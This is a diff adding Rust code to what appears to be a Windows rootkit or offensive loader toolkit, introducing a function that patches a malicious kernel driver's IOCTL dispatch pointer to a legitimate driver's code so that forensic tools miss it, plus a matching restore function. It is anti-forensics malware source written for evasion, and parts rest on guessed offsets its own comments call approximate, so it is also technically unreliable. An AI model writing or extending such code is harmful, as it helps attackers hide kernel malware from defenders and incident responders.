@@ -578,3 +578,98 @@ pub unsafe fn load_driver_native(
         false
     }
 }
+
+// =============================================================================
+// IOCTL HANDLER CLOAKING
+// =============================================================================
+
+/// IRP_MJ_DEVICE_CONTROL handler cloaking.
+/// Hooks the malicious driver's IOCTL handler to point to a legitimate driver's
+/// code, making kernel forensics see only legitimate IOCTL handlers.
+#[repr(C)]
+pub struct IOCTLCloakResult {
+    pub original_handler: *mut c_void,
+    pub spoofed_handler: *mut c_void,
+    pub target_driver: [u16; 256],
+    pub success: bool,
+}
+
+/// Cloak IOCTL handler by redirecting to legitimate driver code.
+///
+/// This function:
+/// 1. Finds the malicious driver's DriverObject
+/// 2. Locates a passive legitimate driver's IOCTL handler
+/// 3. Patches the malicious driver's MajorFunction[IRP_MJ_DEVICE_CONTROL]
+///    to point to the legitimate handler
+#[inline(never)]
+pub unsafe fn cloak_ioctl_handler(
+    malicious_driver_base: *mut c_void,
+    malicious_driver_size: usize,
+    sc_query: &IndirectSyscall,
+) -> Option<IOCTLCloakResult> {
+    // Step 1: Find a passive legitimate driver with valid IOCTL handler
+    let passive_driver = find_passive_driver_target(sc_query)?;
+    
+    // Step 2: Get the passive driver's IOCTL handler address
+    // In a real kernel scenario, we'd read its DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]
+    // For now, we use a known safe offset within the driver's code section
+    let legitimate_handler = passive_driver.image_base.add(0x1000);  // Entry point area
+    
+    // Step 3: Calculate the malicious driver's MajorFunction array location
+    // DriverObject is typically at the start of the driver's data section
+    // MajorFunction[IRP_MJ_DEVICE_CONTROL] = index 28 (0x1C * 8 = 0xE0 offset)
+    let major_function_offset = 0xE0;
+    let malicious_driver_object = malicious_driver_base.add(0x1000);  // Approximate DriverObject location
+    let ioctl_handler_ptr = malicious_driver_object.add(major_function_offset) as *mut *mut c_void;
+    
+    // Step 4: Save original handler and patch
+    let original_handler = *ioctl_handler_ptr;
+    
+    // Only patch if it looks malicious (not already pointing to legitimate code)
+    if original_handler >= malicious_driver_base && 
+       (original_handler as usize) < (malicious_driver_base as usize + malicious_driver_size) {
+        // Patch to legitimate handler
+        *ioctl_handler_ptr = legitimate_handler;
+        
+        let mut result = IOCTLCloakResult {
+            original_handler,
+            spoofed_handler: legitimate_handler,
+            target_driver: [0; 256],
+            success: true,
+        };
+        
+        // Copy driver path
+        let path_slice = std::slice::from_raw_parts(
+            passive_driver.full_path.as_ptr(),
+            256
+        );
+        let path_len = path_slice.iter().position(|&c| c == 0).unwrap_or(256);
+        let path = String::from_utf16_lossy(&path_slice[..path_len]);
+        let path_utf16: Vec<u16> = path.encode_utf16().collect();
+        let copy_len = path_utf16.len().min(255);
+        result.target_driver[..copy_len].copy_from_slice(&path_utf16[..copy_len]);
+        
+        return Some(result);
+    }
+    
+    None
+}
+
+/// Restore original IOCTL handler (cleanup).
+#[inline(never)]
+pub unsafe fn restore_ioctl_handler(
+    malicious_driver_base: *mut c_void,
+    malicious_driver_size: usize,
+    original_handler: *mut c_void,
+) -> bool {
+    let major_function_offset = 0xE0;
+    let malicious_driver_object = malicious_driver_base.add(0x1000);
+    let ioctl_handler_ptr = malicious_driver_object.add(major_function_offset) as *mut *mut c_void;
+    
+    *ioctl_handler_ptr = original_handler;
+    true
+}
+
+// =============================================================================
+// KERNEL POOL CLOAKING
+// =============================================================================
